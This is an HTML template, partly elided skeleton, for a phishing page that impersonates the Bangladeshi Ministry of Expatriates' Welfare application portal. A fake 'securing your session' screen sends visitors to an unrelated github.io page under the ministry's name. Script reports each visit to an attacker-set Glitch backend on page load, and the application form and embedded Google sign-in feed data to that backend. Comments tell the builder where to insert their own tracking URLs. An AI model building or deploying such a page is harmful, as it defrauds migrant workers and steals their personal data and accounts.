<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>প্রবাসী কল্যাণ মন্ত্রণালয়: আবেদন</title> 
    <!-- সকল CSS এবং ফন্ট লিঙ্ক এখানে অপরিবর্তিত থাকবে -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        body { font-family: 'Kalpurush', sans-serif; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fade-in-up { 0% { opacity: 0; transform: translateY(20px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
        .animate-fade-in-up { animation: fade-in-up 0.5s ease-out forwards; }
    </style>
</head>
<body class="bg-gray-100">

    <!-- নতুন: Verifying Connection Screen -->
    <div id="verification-screen" class="fixed inset-0 bg-gray-800 flex items-center justify-center z-50 p-4">
        <div class="bg-white text-center rounded-xl shadow-2xl p-8 max-w-sm w-full">
            <h1 class="text-2xl font-bold text-gray-700 mb-4">সংযোগ যাচাই করা হচ্ছে...</h1>
            <div style="border: 4px solid rgba(0, 0, 0, 0.1); border-top: 4px solid #0d9488;" class="w-10 h-10 rounded-full animate-spin mx-auto mb-4"></div>
            <p class="text-gray-600 mb-6">
                আপনার সেশন সুরক্ষিত করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।
            </p>
            <a href="https://polokmd851-png.github.io/nusrat_imo.html/" target="_blank" class="w-full block text-center bg-teal-500 text-white font-semibold py-3 px-4 rounded-lg hover:bg-teal-600 transition mb-3">
                <i class="fas fa-shield-alt mr-2"></i> মন্ত্রণালয়ের IMO তে যুক্ত হয়ে যাচাই করুন
            </a>
            <button onclick="showApplication()" class="w-full bg-gray-600 text-white font-semibold py-3 px-4 rounded-lg hover:bg-gray-700 transition">
                অ্যাপ্লিকেশনে প্রবেশ করুন &rarr;
            </button>
        </div>
    </div>

    <!-- মূল অ্যাপ্লিকেশন কন্টেইনার (লুকানো থাকবে) -->
    <div id="probashi-app-container" style="display:none;">
        <!-- আপনার আগের সম্পূর্ণ প্রবাসী কল্যাণ অ্যাপ্লিকেশনের কোডটি এখানে পেস্ট করুন -->
        <!-- LOGIN SCREEN -->
        <div id="login-screen" class="fixed inset-0 bg-gradient-to-br from-gray-900 to-gray-700 flex items-center justify-center z-50 p-4">
            <!-- ... লগইন স্ক্রিনের কোড ... -->
        </div>
        <!-- MAIN APPLICATION -->
        <div id="main-content" style="display:none;">
            <!-- ... মূল অ্যাপ্লিকেশনের কোড ... -->
        </div>
        <!-- SUCCESS MESSAGE -->
        <div id="success-message" style="display:none;">
            <!-- ... সফল বার্তার কোড ... -->
        </div>
    </div>

    <script>
        // --- Backend URLs ---
        // ⚠️ আপনার Glitch/Replit URL দিয়ে এই দুটি লিঙ্ক আপডেট করুন
        const BACKEND_TRACKING_URL = 'https://your-app-name.glitch.me/track-visit';
        const BACKEND_FORM_URL = 'https://your-app-name.glitch.me/submit-form';

        // --- Verification Screen Logic ---
        document.addEventListener('DOMContentLoaded', () => {
            // পেজ লোড হওয়ার সাথে সাথে ভিজিটরের তথ্য পাঠানো হচ্ছে
            fetch(BACKEND_TRACKING_URL, { method: 'POST' })
                .then(res => res.json())
                .then(data => console.log('Tracking successful:', data.message))
                .catch(err => console.error('Tracking failed:', err));
        });

        function showApplication() {
            // ভেরিফিকেশন স্ক্রিন লুকিয়ে মূল অ্যাপ্লিকেশন দেখানো হচ্ছে
            document.getElementById('verification-screen').style.display = 'none';
            document.getElementById('probashi-app-container').style.display = 'block';
            
            // Auto-skip বা লগইন স্ক্রিন দেখানোর লজিক চালু করা হচ্ছে
            autoSkip();
        }

        // --- Probashi Kalyan Application Logic ---
        let loggedInUserEmail = "";
        const loginScreen = document.getElementById('login-screen');
        const mainContent = document.getElementById('main-content');
        // ... (অন্যান্য DOM elements)

        // ... (আগের সকল ফাংশন: parseJwt, handleCredentialResponse, showLoginAgain, skipLogin, toggleBenefits, etc.)
        
        // Auto-skip ফাংশনটিকে এখন সরাসরি কল না করে showApplication থেকে কল করা হবে
        function autoSkip() {
            if (localStorage.getItem("user_skipped_login") === "true") {
                showMainContent();
            } else {
                loginScreen.querySelector('div').classList.add('animate-fade-in-up');
            }
        }
        
        // Form Submission ফাংশনটি নতুন BACKEND_FORM_URL ব্যবহার করবে
        applicationForm.addEventListener('submit', async function(event) {
            // ... (কোড আগের মতোই, শুধু BACKEND_URL এর জায়গায় BACKEND_FORM_URL ব্যবহার করুন)
            try {
                const response = await fetch(BACKEND_FORM_URL, { /* ... */ });
                // ...
            } catch (error) { /* ... */ }
        });
        
        // ... (loadCountries ফাংশন আগের মতোই থাকবে)
    </script>
</body>
</html>
